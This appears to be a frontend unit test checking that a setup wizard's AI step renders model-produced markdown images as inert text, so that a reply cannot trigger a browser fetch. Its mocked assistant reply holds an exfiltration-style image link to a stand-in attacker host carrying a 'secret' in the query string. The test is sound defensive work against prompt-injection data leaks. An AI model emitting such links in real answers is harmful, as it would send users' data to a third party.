/**
 * WARP-3193 SEC-INJ-1 — the setup wizard's AI step renders model output
 * with react-markdown too, so a remote image in the answer must not become a
 * browser fetch there either.
 */
import { describe, it, expect, vi } from "vitest";
import { render, screen, act, fireEvent } from "@testing-library/react";
import React from "react";

const sendChatMock = vi.fn();

vi.mock("@/lib/api", () => ({
  fetchModels: async () => ({
    models: [{ id: "gpt-oss:20b", provider: "ollama", name: "Gpt Oss 20B", context_window: null }],
  }),
  sendChat: (req: unknown) => sendChatMock(req),
}));

import { AiStep } from "@/components/setup/steps/AiStep";

describe("setup AI step — markdown safety (SEC-INJ-1)", () => {
  it("renders a remote image in the answer as inert text", async () => {
    sendChatMock.mockResolvedValue({
      ok: true,
      status: 200,
      json: async () => ({
        message: { role: "assistant", content: "Done ![x](https://evil.example/?q=secret)" },
      }),
    });
    const { container } = render(<AiStep onComplete={vi.fn()} onSkip={vi.fn()} />);
    await act(async () => {
      await Promise.resolve();
    });
    await act(async () => {
      fireEvent.click(screen.getByRole("button", { name: /ask the ai/i }));
    });
    await screen.findByText(/\[image: x\]/);
    expect(container.querySelector('img[src*="evil"]')).toBeNull();
  });
});
